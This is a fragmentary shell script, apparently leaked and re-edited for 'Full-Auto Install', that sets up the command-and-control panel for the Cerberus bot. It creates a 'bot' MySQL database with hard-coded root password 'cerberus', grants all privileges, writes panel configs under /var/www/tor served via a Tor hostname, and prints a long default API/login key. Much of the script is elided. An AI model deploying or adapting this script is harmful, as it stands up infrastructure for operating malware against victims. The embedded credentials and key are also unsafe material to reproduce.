...
#Created BY Barunis /leak

#Edited BY GaSX,, Full-Auto Install
...
#cd /home ; wget https://d/ ; unzip d.zip
...
mysql -uroot --password="cerberus" -e "CREATE DATABASE bot /*\!40100 DEFAULT CHARACTER SET utf8 */;"
mysql -uroot --password="cerberus" -e "CREATE USER 'cerberusroot'@'localhost' IDENTIFIED BY 'cerberus';"
mysql -uroot --password="cerberus" bot < dfsql.sql
mysql -uroot --password="cerberus" -e "GRANT ALL PRIVILEGES ON *.* TO 'cerberusroot'@'localhost';"
mysql -uroot --password="cerberus" -e "FLUSH PRIVILEGES;"
#rm -rf bot.sql
...
echo "$cfgjs" > /var/www/tor/config.json
#end
...
EOM
#echo "$cfgjs" > /var/www/tor/config.php
echo "cfgphp" > /var/www/tor/config.php
#end

#user add#
read -r -d '' userddd <<EOM
<?php
require_once 'medoo.php';
...
EOM
echo "$userddd" > /var/www/tor/control/content/config.php
...
echo "<- Default Apicrypt Key / Login Key : UERZ6GmktB0ipJ8YEb3ghZE4dXhHHKAQd54pgqSL98A9XNxxY0NEZfpcV6hlIhftbv9L0tOJdLlMnR3bRgT3JRDpfKjdiO17cQ5g ->"
echo "<- Edited BY GaSX 'GaSXV2#2605' ->"
echo "<- For Add/Edit APIKEY $TORHOSTNAME /control/content/users.php ->"